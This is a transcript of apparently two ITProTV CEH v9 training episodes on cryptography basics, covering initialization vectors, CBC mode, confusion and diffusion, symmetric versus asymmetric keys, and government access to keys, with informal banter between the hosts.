number.\n\n613\n00:29:43.680 --> 00:29:47.200\nBecause there's so many possibilities\nthat unless we get lucky\n\n614\n00:29:47.200 --> 00:29:52.000\nthe likelihood of us guessing that key\njust by sheer random chance by trying\n\n615\n00:29:52.000 --> 00:29:54.790\nmultiple keys is probably very low,\nright, it's not gonna happen.\n\n616\n00:29:54.790 --> 00:29:56.890\nAt least not in a reasonable\namount of time.\n\n617\n00:29:56.890 --> 00:30:00.760\nInitialization vector,\nInitialization vector\n\n618\n00:30:00.760 --> 00:30:05.430\nis essentially the injection of\nrandomness into a process of some kind.\n\n619\n00:30:05.430 --> 00:30:09.760\nWe call in call it formally a non-secret\nbinary vector used as the initialization\n\n620\n00:30:09.760 --> 00:30:11.700\nInitializing input algorithm for\n\n621\n00:30:11.700 --> 00:30:15.800\nthe encryption of a plaintext block\nsequence to increase security by\n\n622\n00:30:15.800 --> 00:30:18.764\nintroducing additional cryptographic\nvariance.Yeah, of course.\n\n623\n00:30:18.764 --> 00:30:21.490\n>> [LAUGH]\n>> Say that three times fast right?\n\n624\n00:30:22.580 --> 00:30:26.860\nWhat I really mean is we gonna take\na certain amount of random code,\n\n625\n00:30:26.860 --> 00:30:29.140\nwe gonna inject it the starting point.\n\n626\n00:30:29.140 --> 00:30:33.320\nInto that process to\nfurther create the unlikely\n\n627\n00:30:33.320 --> 00:30:35.570\ncombination of sequences of characters,\nletters,\n\n628\n00:30:35.570 --> 00:30:39.150\nnumbers that, because of that randomness,\nmakes it that much tougher for\n\n629\n00:30:39.150 --> 00:30:43.630\nsomebody to guess what the proper sequence\nis to run that backwards and decrypt it.\n\n630\n00:30:43.630 --> 00:30:48.820\nSo the IV is gonna become part of that\nsequencing of randomness we want,\n\n631\n00:30:48.820 --> 00:30:51.030\nso that is we do what's called exhorting.\n\n632\n00:30:51.030 --> 00:30:54.760\nWe take the output of one run,\nmove it into the input of the next, and\n\n633\n00:30:54.760 --> 00:30:59.600\nthen propagate that several times through\nthe algorithm as we run through what're\n\n634\n00:30:59.600 --> 00:31:02.340\nknown as essentially multiple iterations.\n\n635\n00:31:02.340 --> 00:31:05.990\nTo be able to do that, we're gonna\ndo this 20 times before we spit out\n\n636\n00:31:05.990 --> 00:31:08.550\nthe cryptographic text or\nfive times or whatever.\n\n637\n00:31:08.550 --> 00:31:12.380\nIf we propagate that randomness through\nthere, it's gonna be harder for\n\n638\n00:31:12.380 --> 00:31:14.270\nsomeone to figure that out.\n\n639\n00:31:14.270 --> 00:31:15.720\nSo it's a great question.\n\n640\n00:31:15.720 --> 00:31:16.690\nIs it like salting?\n\n641\n00:31:16.690 --> 00:31:17.510\nEssentially, yes.\n\n642\n00:31:17.510 --> 00:31:19.970\nIt is similar to the idea\nof salting a hash.\n\n643\n00:31:19.970 --> 00:31:23.690\nWe're including a random string\nof characters as we do the hash\n\n644\n00:31:23.690 --> 00:31:26.240\nto make it harder to\nreverse engineer that hash.\n\n645\n00:31:26.240 --> 00:31:27.260\nWe talked about salting.\n\n646\n00:31:27.260 --> 00:31:30.810\nWe talked about going in and\ndoing some numeration and reconning.\n\n647\n00:31:30.810 --> 00:31:32.364\nAll right and some of the earlier,\nor actually the numeration and\n\n648\n00:31:32.364 --> 00:31:34.296\nsystem [CROSSTALK] hacking, all right,\nsystem hacking and password cracking.\n\n649\n00:31:34.296 --> 00:31:37.457\nSo the outcome is\nessentially the same thing,\n\n650\n00:31:37.457 --> 00:31:43.167\nwe specified salting when we deal with\nhashing with regards to password cracking.\n\n651\n00:31:43.167 --> 00:31:47.325\nWhen we talk about IVs, initialization\nvector, we're talking about using\n\n652\n00:31:47.325 --> 00:31:51.115\nan encryptographic operation in order\nto be able to, when we talk about, for\n\n653\n00:31:51.115 --> 00:31:53.835\ninstance, either a stream or\na block cypher, and\n\n654\n00:31:53.835 --> 00:31:58.320\nhow the block cyphers are going to be\nable to through cipherblock chaining for\n\n655\n00:31:58.320 --> 00:32:01.050\ninstance, CBC mode, right?\n\n656\n00:32:01.050 --> 00:32:04.746\nWe're gonna be talking about how that\ninitialization of randomness works and\n\n657\n00:32:04.746 --> 00:32:05.869\nthen gets propagated.\n\n658\n00:32:05.869 --> 00:32:07.394\nWe can actually show you a quick picture.\n\n659\n00:32:07.394 --> 00:32:08.448\nWe have that at the bottom of the diagram?\n\n660\n00:32:08.448 --> 00:32:09.058\n>> We do.\n\n661\n00:32:09.058 --> 00:32:12.795\n>> We'll take a look at that real quick,\nbut it's called IVs When we do\n\n662\n00:32:12.795 --> 00:32:16.275\nthe confidentiality protection\nwith regards to encryption,\n\n663\n00:32:16.275 --> 00:32:19.685\nwe refer to it as salting when\ndealing with it in the hash just so\n\n664\n00:32:19.685 --> 00:32:24.370\nyou can see the difference but essentially\ntalking about basically the same thing.\n\n665\n00:32:24.370 --> 00:32:24.960\nAll right.\nAll right.\n\n666\n00:32:24.960 --> 00:32:25.530\nSo where are we at?\n\n667\n00:32:25.530 --> 00:32:26.370\nEncoding, decoding.\n\n668\n00:32:26.370 --> 00:32:29.550\nEncoding, the idea of changing\na message into another format through\n\n669\n00:32:29.550 --> 00:32:30.510\nthe use of a code.\n\n670\n00:32:30.510 --> 00:32:32.660\nDecoding, the exact\nopposite process right?\n\n671\n00:32:32.660 --> 00:32:35.740\nSo encoding is just another way of\ntalking about creating cypher text,\n\n672\n00:32:35.740 --> 00:32:38.450\ndecoding another way of\ntalking about plain text.\n\n673\n00:32:38.450 --> 00:32:42.700\nEncrypt, decrypt, encode, decode,\nsame kind of thing, transposition and or\n\n674\n00:32:42.700 --> 00:32:45.310\npermutation, and or substitution.\n\n675\n00:32:45.310 --> 00:32:49.430\nJust various ways that we can go in and\ncontinue to hide and\n\n676\n00:32:49.430 --> 00:32:54.620\nmodify data so it is not seen when we\nare talking about encrypting substitution.\n\n677\n00:32:54.620 --> 00:32:57.540\nHey, instead of a, every time we see\nan a it is gonna be a letter three.\n\n678\n00:32:57.540 --> 00:32:59.150\nThat is a substitution, right?\n\n679\n00:32:59.150 --> 00:33:00.930\nTransposition or permutation.\n\n680\n00:33:00.930 --> 00:33:03.870\nWe gonna shift everything\ndown five letters, so\n\n681\n00:33:03.870 --> 00:33:05.710\nwhen it should be a it\nis really gonna be f or\n\n682\n00:33:05.710 --> 00:33:09.075\nwhatever the equivalent of that would\nbe because I'm horrible with my ABCs.\n\n683\n00:33:09.075 --> 00:33:12.660\n>> [LAUGH]\n>> But you get the idea, confusion and\n\n684\n00:33:12.660 --> 00:33:17.420\ndiffusion, yet another way of\ncreating this same effect providing,\n\n685\n00:33:17.420 --> 00:33:19.240\nwhen we talk about confusion.\n\n686\n00:33:20.770 --> 00:33:22.520\nWe are gonna be mixing or\n\n687\n00:33:22.520 --> 00:33:25.590\nchanging the key values up during\nthe repeated rounds of encryption.\n\n688\n00:33:25.590 --> 00:33:27.980\nI mention the soaring and diffusion.\n\n689\n00:33:27.980 --> 00:33:31.000\nWe're gonna provide diffusion\nby mixing up the location of\n\n690\n00:33:31.000 --> 00:33:32.570\nplaintext throughout the ciphertext.\n\n691\n00:33:32.570 --> 00:33:36.200\nWe're distributing it, diffusing it\nthrough the message to further hide it.\n\n692\n00:33:36.200 --> 00:33:40.170\nThese are all ways we achieve essentially\nthe protection we're looking for\n\n693\n00:33:40.170 --> 00:33:43.700\nby making it more complicated for\npeople to figure out what we're doing or\n\n694\n00:33:43.700 --> 00:33:45.170\nthey can just listen to us explain things.\n\n695\n00:33:45.170 --> 00:33:47.720\nThat would probably just also\nachieve the same effect.\n\n696\n00:33:47.720 --> 00:33:48.890\n>> That would give us confusion.\n\n697\n00:33:48.890 --> 00:33:52.440\n>> Ultimately lots, massive confusion and\nthen the avalanche effect.\n\n698\n00:33:52.440 --> 00:33:56.860\nThe avalanche effect is when we are going\nto have a minor change That occurs and\n\n699\n00:33:56.860 --> 00:33:58.140\nthen gets amplified and\n\n700\n00:33:58.140 --> 00:34:02.360\nmirrored down through those multiple\nrounds and essentially propagates and\n\n701\n00:34:02.360 --> 00:34:06.020\nbecomes significant at some point\nbecause we pushed that forward and\n\n702\n00:34:06.020 --> 00:34:09.960\nwe roll that up and it becomes more and\nmore important as we go.\n\n703\n00:34:09.960 --> 00:34:13.650\nSo let us show you real quickly what\nwe're talking about the IV here.\n\n704\n00:34:13.650 --> 00:34:17.090\nSo, we go down below with Electronic Code\nBooking, and go down to the next one,\n\n705\n00:34:17.090 --> 00:34:18.430\nCyber Block Chaining right there.\n\n706\n00:34:18.430 --> 00:34:20.590\nOkay, just go down to the diagram,\nwe don't need to do that.\n\n707\n00:34:20.590 --> 00:34:21.650\nCan we zoom in a little bit just so\n\n708\n00:34:21.650 --> 00:34:24.170\nthat everybody can see\nthat a little bit better?\n\n709\n00:34:24.170 --> 00:34:26.910\nSo, here's an example of what\nwe're talking about with the IV,\n\n710\n00:34:26.910 --> 00:34:29.740\ncan we move over to the center there?\n\n711\n00:34:29.740 --> 00:34:31.585\n>> [INAUDIBLE] [CROSSTALK]\n>> No.\n\n712\n00:34:31.585 --> 00:34:32.490\nOkay, there we go, perfect.\n\n713\n00:34:32.490 --> 00:34:34.710\nOkay, so yeah, let's turn it blue.\n\n714\n00:34:34.710 --> 00:34:36.720\n>> Except for, yeah,\nthat'll make it, okay.\n\n715\n00:34:36.720 --> 00:34:39.221\n>> Yeah, except for that cuz that\npart's gonna make it harder to see.\n\n716\n00:34:39.221 --> 00:34:42.025\n>> [LAUGH]\n>> [LAUGH] All right, so what we see here,\n\n717\n00:34:42.025 --> 00:34:45.960\nright, this is just one of the ways in\nwhich a block cipher, or cipher running\n\n718\n00:34:45.960 --> 00:34:49.290\nin block cipher mode is gonna behave and\n>> We happen to have it in the document so\n\n719\n00:34:49.290 --> 00:34:50.550\nwe can easily show it to you.\n\n720\n00:34:50.550 --> 00:34:52.090\nSo you see up top we have plain text.\n\n721\n00:34:52.090 --> 00:34:55.670\nYou see there that we have\nthe initialization vector coming in,\n\n722\n00:34:55.670 --> 00:34:59.460\nbeing injected into the process, that\nrandom string we're gonna insert there\n\n723\n00:34:59.460 --> 00:35:02.600\nprior to us running the encryption\ncycle with the key and\n\n724\n00:35:02.600 --> 00:35:05.470\nthe block cypher encryption\nblock down below.\n\n725\n00:35:05.470 --> 00:35:09.040\nSo we take the plain text plus the IV,\nwe inject or\n\n726\n00:35:09.040 --> 00:35:13.550\ninsert it Into the encryption mechanism,\nthe key is used, we turn it on.\n\n727\n00:35:13.550 --> 00:35:17.060\nIn other words, we run it out the bottom,\ndrops out the Ciphertext.\n\n728\n00:35:17.060 --> 00:35:21.920\nNow that Ciphertext is used as the input\nfor the round, we are still injecting\n\n729\n00:35:21.920 --> 00:35:26.240\nrandomness, but now what we're doing is\nwe're using instead of a random IV we\n\n730\n00:35:26.240 --> 00:35:31.110\nare propagating the IV through the process\nby using the output of the prior run.\n\n731\n00:35:31.110 --> 00:35:35.060\nThe cipher text should now become\nthe IV input for the next one as we go.\n\n732\n00:35:35.060 --> 00:35:38.050\n>> Which is really something to get us\nstarted because with that first round we\n\n733\n00:35:38.050 --> 00:35:41.430\ndon't have any cipher texts to inject-\n>> Correct, in with the playing text.\n\n734\n00:35:41.430 --> 00:35:43.560\n>> Right.\nSo that's the exact reason we do it.\n\n735\n00:35:43.560 --> 00:35:45.620\nAnd then the multiple rounds we go\nthrough however many there are.\n\n736\n00:35:45.620 --> 00:35:46.810\nWe have three in the diagram but\n\n737\n00:35:46.810 --> 00:35:50.300\nhowever many there are is then going\nto continue to propagate that as we go.\n\n738\n00:35:50.300 --> 00:35:54.720\nAnd then at the final round when we get\ncipher text out the back that cipher text\n\n739\n00:35:54.720 --> 00:35:59.900\nis made up of not just right,\nthe information that we did one time.\n\n740\n00:35:59.900 --> 00:36:03.670\nBut that's gonna be made up of multiple\nrounds of that being propagated.\n\n741\n00:36:03.670 --> 00:36:06.040\nSo that's gonna be very important for\nus to think about.\n\n742\n00:36:06.040 --> 00:36:08.334\nSo, hopefully that helps but\n\n743\n00:36:08.334 --> 00:36:12.531\nthat's gonna show you actually how we\ndo this and where it actually pops up.\n\n744\n00:36:12.531 --> 00:36:15.630\n>> All right, I think that's gonna\ndo it for our vocabulary terms.\n\n745\n00:36:15.630 --> 00:36:17.280\nAgain, he wasn't kidding, right?\n\n746\n00:36:17.280 --> 00:36:19.960\nAn entire episode on vocab.\n\n747\n00:36:19.960 --> 00:36:23.170\nIt just stresses the importance of\nmaking sure that we understand these\n\n748\n00:36:23.170 --> 00:36:25.970\nkey concepts,\nbecause without that as we go through and\n\n749\n00:36:25.970 --> 00:36:29.640\ntalk about the rest of cryptography,\nit's not going to make as much sense.\n\n750\n00:36:29.640 --> 00:36:30.520\nSo we thank you for that for\n\n751\n00:36:30.520 --> 00:36:33.540\ntaking the time to make sure we\nall have those terms down pat.\n\n752\n00:36:33.540 --> 00:36:36.880\nDo your vocab cards, your flash cards,\nwhatever you got to do make sure you have\n\n753\n00:36:36.880 --> 00:36:40.340\nthose down for the next episode when we\ncome back with more cryptography, but for\n\n754\n00:36:40.340 --> 00:36:44.040\nnow signing off for\nITProTV I've been your host Mike Rodrick.\n\n755\n00:36:44.040 --> 00:36:46.275\n>> ABC 456 signing off.\n\n756\n00:36:46.275 --> 00:36:50.645\n>> [LAUGH] And we'll see you next time.\n\n757\n00:36:50.645 --> 00:36:57.510\n[SOUND]\n\n",

00:00:15.762\n>> Hello.\n\n4\n00:00:15.762 --> 00:00:20.621\n>> [LAUGH] I'm your host Mike Rodrick and\ntoday we're doing our CEH Version 9.\n\n5\n00:00:20.621 --> 00:00:22.204\nAnd specifically in this episode,\n\n6\n00:00:22.204 --> 00:00:25.221\nwe're actually continuing our\nthought process on cryptography.\n\n7\n00:00:25.221 --> 00:00:27.660\nSo if you missed the first one,\nmake sure you go back and watch that,\n\n8\n00:00:27.660 --> 00:00:30.810\nit had a lot of our foundational\nknowledge, really, for cryptography.\n\n9\n00:00:30.810 --> 00:00:34.650\nWe went over a lot of vocabulary terms and\nconcepts that we need to make sure we\n\n10\n00:00:34.650 --> 00:00:37.870\nunderstand as we progress\nthrough this information.\n\n11\n00:00:37.870 --> 00:00:40.630\nAnd now we're gonna take\na closer look at cryptography and\n\n12\n00:00:40.630 --> 00:00:44.780\neven do a couple demos for you, and here\nto do all that for us is Mr. Adam Gordon.\n\n13\n00:00:44.780 --> 00:00:45.546\nHow you doing, Adam?\n\n14\n00:00:45.546 --> 00:00:46.446\n>> I'm good,\n\n15\n00:00:46.446 --> 00:00:50.240\nI'm good, I am feeling, encrypted-\n>> [LAUGH]\n\n16\n00:00:50.240 --> 00:00:51.640\n>> This morning, shall we say.\n\n17\n00:00:51.640 --> 00:00:53.462\nWe'll see if we can decrypt\nthat thought process-\n\n18\n00:00:53.462 --> 00:00:54.275\n>> There we go.\n\n19\n00:00:54.275 --> 00:00:56.080\n>> As we go.\nSo, good to have everybody back.\n\n20\n00:00:56.080 --> 00:00:59.650\nAs Mike said in the last episode,\nin this particular topic,\n\n21\n00:00:59.650 --> 00:01:03.655\nwe spent literally the entire\nepisode talking about vocabulary,\n\n22\n00:01:03.655 --> 00:01:09.190\nthought processes around how we define and\nuse terms, what is cryptography,\n\n23\n00:01:09.190 --> 00:01:13.690\nwhat is asymmetric, what is symmetric\ncryptography, what is a synchronous versus\n\n24\n00:01:13.690 --> 00:01:17.160\nasynchronous solution,\nwow do we encrypt, how do we decrypt.\n\n25\n00:01:17.160 --> 00:01:19.880\nI could go on and on but\nthat why we shoot the episodes.\n\n26\n00:01:19.880 --> 00:01:20.715\nAnd you go back and\n\n27\n00:01:20.715 --> 00:01:24.070\nwatch them so I dont have to spend\nthis episode replaying last episode.\n\n28\n00:01:24.070 --> 00:01:26.761\nSo, we're gonna move on cuz that what\nyou do in life, you get over things and\n\n29\n00:01:26.761 --> 00:01:27.365\nyou keep going.\n\n30\n00:01:27.365 --> 00:01:28.149\n>> We're all like that.\n\n31\n00:01:28.149 --> 00:01:29.153\n>> Yeah cuz, we're adults,\n\n32\n00:01:29.153 --> 00:01:31.930\nso that's what you gotta do when\nyou are an adult, you move on.\n\n33\n00:01:31.930 --> 00:01:34.071\nAll right, so here we are,\nwalking through cryptography.\n\n34\n00:01:34.071 --> 00:01:37.747\nI'm sorry guys, it's been just a long\nweek, what can I tell you, so.\n\n35\n00:01:37.747 --> 00:01:39.150\n>> [LAUGH]\n>> But\n\n36\n00:01:39.150 --> 00:01:40.640\nanyway, let's talk about cryptography.\n\n37\n00:01:40.640 --> 00:01:43.729\nSo we have been talking about all\nthe different things that go into\n\n38\n00:01:43.729 --> 00:01:47.546\ncryptography, the recipe if you will,\nright, to be able to encrypt and decrypt\n\n39\n00:01:47.546 --> 00:01:51.441\nis varied and is very very colorful in the\nsense that there is a lot of moving parts.\n\n40\n00:01:51.441 --> 00:01:53.712\nAnd what I wanna do is,\nwe could start it here,\n\n41\n00:01:53.712 --> 00:01:57.050\nis really focus in on two of the key,\nno pun intended, you get that?\n\n42\n00:01:57.050 --> 00:01:58.150\n>> [LAUGH] I do that was a good one?\n\n43\n00:01:58.150 --> 00:01:59.080\n>> That was a good one, right?\n\n44\n00:01:59.080 --> 00:02:02.920\nTwo of the key criteria and moving parts,\nand we're gonna actually put some pictures\n\n45\n00:02:02.920 --> 00:02:05.130\nup here in a minute, not yet\nbut just in a second.\n\n46\n00:02:05.130 --> 00:02:06.890\nWe're gonna talk about, and\n\n47\n00:02:06.890 --> 00:02:11.430\nI know Mike will agree because we've done\nthis before, that really talking through\n\n48\n00:02:11.430 --> 00:02:16.270\nthe differences of symmetric\nversus asymmetric cryptography.\n\n49\n00:02:16.270 --> 00:02:18.530\nSymmetric or single key, private key,\n\n50\n00:02:18.530 --> 00:02:23.050\nsometimes referred to as shared key\ncryptography, versus asymmetric.\n\n51\n00:02:23.050 --> 00:02:27.641\nPublic, private key, key pair,\nWonder Twin power activate cryptography.\n\n52\n00:02:27.641 --> 00:02:31.293\nI think you would agree that, while we can\ntalk about it, and we can paint a decent\n\n53\n00:02:31.293 --> 00:02:34.223\npicture, it's sometimes hard\nto keep track of stuff, right?\n\n54\n00:02:34.223 --> 00:02:36.354\nAnd if we actually paint\na picture with words, but\n\n55\n00:02:36.354 --> 00:02:40.100\nthen put it up on the screen for you,\nwhich we're going to do in a minute.\n\n56\n00:02:40.100 --> 00:02:44.350\nI find when I teach, I find when I talk\nto customers about this, that it becomes\n\n57\n00:02:44.350 --> 00:02:50.020\na lot more available for you, it's\neasier to track, keep track of and see.\n\n58\n00:02:50.020 --> 00:02:51.980\nAnd so we're gonna do that for\nyou, we're gonna walk through.\n\n59\n00:02:51.980 --> 00:02:55.010\nMike's actually put together\na great set of diagrams for us and\n\n60\n00:02:55.010 --> 00:02:56.410\nwe're gonna walk through.\n\n61\n00:02:56.410 --> 00:02:58.860\nNow we're gonna talk about all\nthe different options we have.\n\n62\n00:02:58.860 --> 00:03:00.390\nHow do we digitally sign?\n\n63\n00:03:00.390 --> 00:03:01.590\nHow do we encrypt?\n\n64\n00:03:01.590 --> 00:03:03.876\nWhat do we do when we have\na single key exchange,\n\n65\n00:03:03.876 --> 00:03:06.520\nwhere we do have a public/private\nkey pair exchange?\n\n66\n00:03:06.520 --> 00:03:09.450\nHow's Bob and Alice gonna get together and\nhow are they gonna talk?\n\n67\n00:03:09.450 --> 00:03:10.960\nSo, we're gonna take a look at all that.\n\n68\n00:03:10.960 --> 00:03:12.800\nAnd then when once we go through that,\n\n69\n00:03:12.800 --> 00:03:16.850\nI think hopefully, that information really\nbecomes something that you can take.\n\n70\n00:03:16.850 --> 00:03:20.210\nAnd not just use in the context of CEH,\nit's gonna be very important for\n\n71\n00:03:20.210 --> 00:03:22.490\nyou with regards to preparing for\nthe exam, certainly.\n\n72\n00:03:22.490 --> 00:03:24.970\nAnd you've gotta know this and\nyou just gotta know this cold,\n\n73\n00:03:24.970 --> 00:03:26.200\nthere's no other way to say it.\n\n74\n00:03:26.200 --> 00:03:29.220\nYou gotta know who has what key,\nwhat they're doing,\n\n75\n00:03:29.220 --> 00:03:33.120\nwhat the output of that process is,\nand how we can break that process.\n\n76\n00:03:33.120 --> 00:03:35.851\nOr in some cases, how we can't,\nif we do it successfully.\n\n77\n00:03:35.851 --> 00:03:37.380\nWe're gonna spend time on that.\n\n78\n00:03:37.380 --> 00:03:40.826\nBut out beyond that, out beyond the exam,\nbecomes very critical,\n\n79\n00:03:40.826 --> 00:03:41.970\nyou know what I mean?\n\n80\n00:03:41.970 --> 00:03:45.560\nI know those of you that want\nto become CEH-certified,\n\n81\n00:03:45.560 --> 00:03:48.970\nthat's the primary goal initially, and\nI get that, and that's really important.\n\n82\n00:03:48.970 --> 00:03:50.690\nBut as we've talked\nabout in prior episodes,\n\n83\n00:03:50.690 --> 00:03:52.640\nyeah that's just the beginning\nof the journey, right?\n\n84\n00:03:52.640 --> 00:03:55.860\nYou've gotta take that knowledge, you've\ngotta be able to apply it, personalize,\n\n85\n00:03:55.860 --> 00:03:57.060\nand make it your own.\n\n86\n00:03:57.060 --> 00:03:59.120\nBut also make it relevant\nto your customers,\n\n87\n00:03:59.120 --> 00:04:02.190\nmake it relevant to those you work for,\nyou work with.\n\n88\n00:04:02.190 --> 00:04:05.920\nThose you defend and those that you\nare trying to help be more secure.\n\n89\n00:04:05.920 --> 00:04:09.690\nAnd if you can't take this knowledge,\nmake it consumable for them,\n\n90\n00:04:09.690 --> 00:04:14.980\nexplain it to them, show them how this\nbecomes important and relevant for them?\n\n91\n00:04:14.980 --> 00:04:18.390\nThen we haven't done our job, that's\njust something we haven't done well, and\n\n92\n00:04:18.390 --> 00:04:20.440\nwe wanna make sure you\nunderstand how to do that.\n\n93\n00:04:20.440 --> 00:04:23.120\nSo, we're gonna spend some time\ngoing through that with now.\n\n94\n00:04:23.120 --> 00:04:25.190\nHopefully it's gonna prove\nto be valuable for you.\n\n95\n00:04:25.190 --> 00:04:27.820\nRemember, as we get into this,\nsymmetric single key.\n\n96\n00:04:27.820 --> 00:04:29.435\nHopefully that helps\nyou to figure that out.\n\n97\n00:04:29.435 --> 00:04:31.108\nThat single key is private, right?\n\n98\n00:04:31.108 --> 00:04:33.560\nIt's a private key,\ngonna illustrate what that is.\n\n99\n00:04:33.560 --> 00:04:36.934\nPrivate, I think, is gonna be coded red\nif I'm not mistaken in our diagrams.\n\n100\n00:04:36.934 --> 00:04:37.724\nNot always thought, right?\n\n101\n00:04:37.724 --> 00:04:38.493\n>> Not always.\n>> Okay.\n\n102\n00:04:38.493 --> 00:04:39.536\n>> For symmetric, I did use blue.\n\n103\n00:04:39.536 --> 00:04:40.251\n>> Okay, all right.\n\n104\n00:04:40.251 --> 00:04:41.326\nSo we'll take a look,\nwe'll take a look at that.\n\n105\n00:04:41.326 --> 00:04:43.049\n>> [LAUGH]\n>> But it's gonna be a color of choice,\n\n106\n00:04:43.049 --> 00:04:43.844\nMike gets to choose.\n\n107\n00:04:43.844 --> 00:04:44.535\n>> That's right.\n\n108\n00:04:44.535 --> 00:04:46.326\n>> And then when we talk about asymmetric,\n\n109\n00:04:46.326 --> 00:04:48.940\nwe're talking about\npublic/private key pairs.\n\n110\n00:04:48.940 --> 00:04:51.430\nWe'll talk about that,\nshow you what that concept is.\n\n111\n00:04:51.430 --> 00:04:54.434\nJust before we go there, let's talk about\nthis other little interesting thing, and\n\n112\n00:04:54.434 --> 00:04:55.570\nwe've talked about it before.\n\n113\n00:04:56.725 --> 00:05:01.345\nI've mentioned it with regards to cloud,\ncertainly in the cloud episodes.\n\n114\n00:05:01.345 --> 00:05:05.579\nWe've talked about the fact that\nthere may be a way in which a entity,\n\n115\n00:05:05.579 --> 00:05:10.105\nusually a government entity or\nlaw enforcement entity, may come along,\n\n116\n00:05:10.105 --> 00:05:14.631\nmay serve a E-Discovery order or\nmay serve some sort of FISA court order,\n\n117\n00:05:14.631 --> 00:05:18.364\nwhatever it may be,\nto look at information at the provider.\n\n118\n00:05:18.364 --> 00:05:22.459\nThe provider, the cloud service provider,\nmay then have to comply and\n\n119\n00:05:22.459 --> 00:05:26.564\ngive access to the data stream and/or\nencrypted or unencrypted data.\n\n120\n00:05:26.564 --> 00:05:31.017\nAnd we talk about this as being Government\nAccess to Keys or what's called GAK,\n\n121\n00:05:31.017 --> 00:05:32.890\nG-A-K, traditionally.\n\n122\n00:05:32.890 --> 00:05:37.600\nGovernment access to keys is the idea that\nthe provider, or the owner of record of\n\n123\n00:05:37.600 --> 00:05:42.310\nthe information, whoever, whatever\nthat may be, means the company, or\n\n124\n00:05:42.310 --> 00:05:46.870\nthe entity, will give copies of all\nthe encryption keys to the government,\n\n125\n00:05:46.870 --> 00:05:49.630\nor the representative of the government,\nwhoever that may be,\n\n126\n00:05:49.630 --> 00:05:54.690\nwhatever agency that is, to allow them to\nview the data that's going back and forth.\n\n127\n00:05:54.690 --> 00:05:56.712\nAnd so we just wanna think about that,\n\n128\n00:05:56.712 --> 00:06:00.012\nit's essentially like wire\ntapping in the old days, right?\n\n129\n00:06:00.012 --> 00:06:03.528\nGovernment would be able to come in,\nplug in, or law enforcement, all right,\n\n130\n00:06:03.528 --> 00:06:06.520\nrepresentative of the government\nwill be able to come in, plug in,\n\n131\n00:06:06.520 --> 00:06:10.154\nadd a telephone switching exchange, and\nliterally listen to the conversation.\n\n132\n00:06:10.154 --> 00:06:12.158\nThe problem is now that\neverything is digital,\n\n133\n00:06:12.158 --> 00:06:14.020\nyou can't tap into the phone line anymore.\n\n134\n00:06:14.020 --> 00:06:16.659\nI mean, you can but\nit just doesn't work the same way, so\n\n135\n00:06:16.659 --> 00:06:20.165\nthe idea is technology's different,\nand what we're doing with tapping is\n\n136\n00:06:20.165 --> 00:06:24.075\nessentially pulling those encrypted or\nnon encrypted bits out of the stream.\n\n137\n00:06:24.075 --> 00:06:27.375\nRecording them, monitoring them, and\nthen letting them go on their way.\n\n138\n00:06:27.375 --> 00:06:31.056\nSo, the government's access to keys\nconcept is essentially the modern version\n\n139\n00:06:31.056 --> 00:06:32.256\nof wire tapping, right?\n\n140\n00:06:32.256 --> 00:06:35.983\nSo we just wanna make sure we're thinking\nabout that as a vocabulary item slash\n\n141\n00:06:35.983 --> 00:06:39.325\nknowledge item, just to make sure\nwe're comfortable with the idea.\n\n142\n00:06:39.325 --> 00:06:41.540\nCan we go to those diagrams\non Mike's machine?\n\n143\n00:06:41.540 --> 00:06:43.570\n>> Okay.\n>> And let's start talking about that.\n\n144\n00:06:43.570 --> 00:06:46.842\nForgive me, sir, and I think I know\nwhat it is, but it is so far away and\n\n145\n00:06:46.842 --> 00:06:50.360\nthe writing at the bottom so small I\ncannot see what that is, so you tell me.\n\n146\n00:06:50.360 --> 00:06:51.437\nIs that symmetric or asymmetric?\n\n147\n00:06:51.437 --> 00:06:52.135\n>> This is going to be symmetric.\n\n148\n00:06:52.135 --> 00:06:55.434\n>> Symmetric, so Mike's going to keep me\nhonest and narrate for me and tell me what\n\n149\n00:06:55.434 --> 00:06:58.750\nthose pretty little tabs on the bottom\nsay because, well, what can I tell you?\n\n150\n00:06:58.750 --> 00:06:59.950\nI didn't have my carrots this morning.\n\n151\n00:06:59.950 --> 00:07:00.857\n>> [LAUGH]\n>> So I just can't see\n\n152\n00:07:00.857 --> 00:07:02.095\nthe writing down there.\n\n153\n00:07:02.095 --> 00:07:04.055\nAlright, so\nwe're dealing with symmetric first, right?\n\n154\n00:07:04.055 --> 00:07:07.325\nSo, we have Alice sitting\nover there on the left.\n\n155\n00:07:07.325 --> 00:07:08.939\nVery nice hair day for Alice-\n>> It is-\n\n156\n00:07:08.939 --> 00:07:09.474\n>> I like it, it's pretty good.\n\n157\n00:07:09.474 --> 00:07:09.995\n>> She's looking good this morning.\n\n158\n00:07:09.995 --> 00:07:11.552\n>> She's looking very nice this morning.\n\n159\n00:07:11.552 --> 00:07:14.197\nWe've got Bob over there, and\nwe see Bob off to the right.\n\n160\n00:07:14.197 --> 00:07:16.187\nSo Alice is gonna be sending to Bob.\n\n161\n00:07:16.187 --> 00:07:19.567\nWe have a one way transmission,\na little unidirectional arrow,\n\n162\n00:07:19.567 --> 00:07:23.940\nindicating that the data, a little blue\nfolded page, right, is gonna be sent over.\n\n163\n00:07:23.940 --> 00:07:25.760\nWe've got our bad actor, our attacker.\n\n164\n00:07:25.760 --> 00:07:28.110\nYou should put an eye patch or\nsomething on him.\n\n165\n00:07:28.110 --> 00:07:31.040\nHe looks like Bob except he's just\ngot a little hook on his arm or\n\n166\n00:07:31.040 --> 00:07:31.980\nsomething, right?\n\n167\n00:07:31.980 --> 00:07:34.965\nSo, we could easily see\nthe attacker substitute for Bob and\n\n168\n00:07:34.965 --> 00:07:35.900\nbe like-\n>> Right\n\n169\n00:07:35.900 --> 00:07:37.500\n>> Bob Attacker or Attacker Bob\n\n170\n00:07:37.500 --> 00:07:38.840\n>> And I think that's the idea,\n\n171\n00:07:38.840 --> 00:07:40.832\nhe's trying to hide and pretend he's Bob.\n\n172\n00:07:40.832 --> 00:07:42.285\n>> Okay, so Alice won't know, I got you.\n\n173\n00:07:42.285 --> 00:07:45.600\n>> Yeah, or we could draw a little-\n>> Put one over on Alice, I see.\n\n174\n00:07:45.600 --> 00:07:46.394\n>> Nope, we can't do horns.\n\n175\n00:07:46.394 --> 00:07:49.214\n>> No, no, no, so the eye patch or\nsomething would have been cool.\n\n176\n00:07:49.214 --> 00:07:50.600\n>> [LAUGH]\n>> All right, so anyway, so\n\n177\n00:07:50.600 --> 00:07:51.504\nwe have the attacker down there.\n\n178\n00:07:51.504 --> 00:07:54.703\nAnd so\nAlice is trying to send some information,\n\n179\n00:07:54.703 --> 00:07:59.709\nthe data represented by the blue Text or\nwhatever would be going over 